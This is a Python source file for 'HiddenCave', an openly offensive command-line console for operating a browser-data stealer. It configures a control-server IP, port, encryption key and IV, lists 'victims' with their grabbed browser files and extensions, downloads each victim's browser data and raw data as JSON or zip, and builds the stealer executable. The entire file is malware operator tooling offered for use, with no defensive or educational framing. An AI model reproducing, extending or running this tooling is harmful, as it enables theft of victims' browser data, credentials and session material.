import cmd
import os
import json
from utils.asciiart import banner
from models.CORE import Core


class HiddenCave(cmd.Cmd):
    prompt = "$HiddenCave-> "
    doc_header = "Use help <command> for more information."
    core = Core()

    def default(self, arg):
        print("[-] Invalid command, use help for information.")

    def do_exit(self, arg):
        "exit the CLI.\n"
        exit(0)

    def do_clear(self, arg):
        "clear the stdout.\n"
        if os.name == 'nt':
            _ = os.system('cls')
        else:
            _ = os.system('clear')

    def do_set(self, arg):
        "set attributes\nusage: set <attribute> <value>\n"
        args = arg.split(" ")
        if len(args) != 2:
            print("[*] Missing parameters.")
        elif args[0].lower() == "ip":
            if self.core.IsValidIpv4(args[1]) is False:
                print("[-] Invalid IP address.")
            self.core.ip = args[1]
        elif args[0].lower() == "port":
            if self.core.IsValidPort(args[1]) is False:
                print("[-] Invalid port.")
            self.core.port = args[1]
        elif args[0].lower() == "key":
            if args[1].lower() == "rand":
                self.core.EncryptionKey = self.core.RandomString(32).encode("utf-8")
                return

            if len(args[1]) != 32:
                print("[-] Invalid key length. Expected 32.")
                return

            self.core.EncryptionKey = args[1].encode("utf-8")
        elif args[0].lower() == "iv":
            if args[1].lower() == "rand":
                self.core.IV = self.core.RandomString(32).encode("utf-8")
                return

            if len(args[1]) != 32:
                print("[-] Invalid IV length. Expected 12")
                return

            self.core.IV = args[1].encode("utf-8")

    def do_show(self, arg):
        print(f"[+] IP: {self.core.ip}")
        print(f"[+] Port: {self.core.port}")
        print(f"[+] Encryption Key: {"NULL" if self.core.EncryptionKey is None else self.core.EncryptionKey.decode('utf-8')}")
        print(f"[+] IV: {"NULL" if self.core.IV is None else self.core.IV.decode('utf-8')}")

    def do_save(self, arg):
        "save the current cryptographic settings.\nusage: save <filename>\n"
        args = arg.split(".")
        if args[-1] != "json":
            print("[-] Invalid file name, The file must have the json file extention \".json\".")
            return

        if self.core.ip is None or self.core.port is None or self.core.EncryptionKey is None or self.core.IV is None :
            print("[-] Nothing to save.")
            return

        if os.path.isfile(arg) is True:
            IsTrue = self.core.GetUserInput("[!] File already exists. Do you want to overwrite the file? (Y/N): ", "Input must be either Y or N", 0, ["y", "n"], True)
            if IsTrue == "n":
                return

        self.core.save(arg)
        print("[+] Done.")

    def do_load(self, arg):
        "load the cryptographic settings from a file.\nusage: load <filename>\n"
        args = arg.split(".")
        if args[-1] != "json":
            print("[-] Invalid file name, the file must have the json file extention \".json\".")
            return

        if self.core.ip is not None or self.core.port is not None or self.core.EncryptionKey is not None or self.core.IV is not None :
            UserInput = self.core.GetUserInput("[!] The current settings will be overwritten, do you wanna continue? (Y/N): ", "Input must be either Y or N", 0, ["y", "n"], True)
            if UserInput == "n":
                return

        if os.path.isfile(arg) is False:
            print("[-] The file does not exist.")
            return

        self.core.load(arg)
        print("[+] Done.")

    def do_check(self, arg):
        "API and cryptographic parameters check command\n"
        if self.core.ip is None:
            print("[-] IP is missing.")
            return
        if self.core.port is None:
            print("[-] Port is missing.")
            return
        if self.core.EncryptionKey is None:
            print("[-] Encryption key is missing.")
            return
        if self.core.IV is None:
            print("[-] IV is missing.")
            return

        if self.core.IsUP() is True:
            print("[+] All good.")
            self.core.IsReady = True

    def do_listv(self, arg):
        "list the current victims.\n"
        if self.core.IsReady is not True:
            print("[-] You have to run and pass the check by running the check command.")
            return

        self.AllVictimsData = self.core.GetVictims()

        if self.AllVictimsData is not None:
            if len(self.AllVictimsData) == 0:
                print("[+] No victims.")
                return

            for ip in self.AllVictimsData.keys():
                TotalBrowsers = int(self.AllVictimsData[ip]["BrowserCount"])
                print("#" * 35)
                print(f"[+] Victim IP: {ip}")
                print(f"[+] Total grabbed browsers: {TotalBrowsers}")

                for i in range(0, TotalBrowsers):
                    print(f"[+] Browser {i + 1}")

                    extentions = self.AllVictimsData[ip]["browsers"][i]["extentions"]
                    BrowserFiles = self.AllVictimsData[ip]["browsers"][i]["browserfiles"]

                    print("    Browser files:")
                    for file in BrowserFiles:
                        print(f"\t- {file}")

                    print("    Extentions:")
                    for extention in extentions.keys():
                        print(f"\t- {extention}")
            print("#" * 35)
        else:
            print("[-] You should first run the command check to check the API status and cryptographic parameters.")

    def do_grabdata(self, arg):
        "grabdata a victim\'s browser data.\nusage: grabdata <victim's ip address>.\n"
        if self.core.IsReady is not True:
            print("[-] You have to run and pass the check by running the check command.")
            return

        if len(arg) == 0:
            print("[-] Invalid input.")
            return

        data = self.core.GetVictimBrowsersData(arg)
        if data is not None:
            FileName = arg + ".json"
            file = open(FileName, "w")
            json.dump(data, file, indent=4)
            file.close()
            print(f"[+] Done, data has been saved in {FileName}")

    def do_grabraw(self, arg):
        "grabd a victim\'s raw data.\nusage: grabraw <victim's ip address>.\n"
        if self.core.IsReady is not True:
            print("[-] You have to run and pass the check by running the check command.")
            return

        if len(arg) == 0:
            print("[-] Invalid input.")
            return

        data = self.core.GetVictimData(arg)
        if data is not None:
            FileName = arg + ".zip"
            file = open(FileName, "wb")
            file.write(data)
            file.close()
            print(f"[+] Done, data has been saved in {FileName}")

    def do_build(self, arg):
        "build the stealer.\n"
        if self.core.ip is None:
            print("[-] IP is NULL, set it before you can build the stealer.")
            return
        if self.core.port is None:
            print("[-] Port is NULL, set it before you can build the stealer.")
            return

        self.core.BuildExe(self.core.ip, self.core.ip)
        print("[+] Building is done, the executable is in payload/bin.")



if __name__ == '__main__':
    try:
        print(banner)
        HiddenCave().cmdloop()
    except KeyboardInterrupt:
        exit(0)
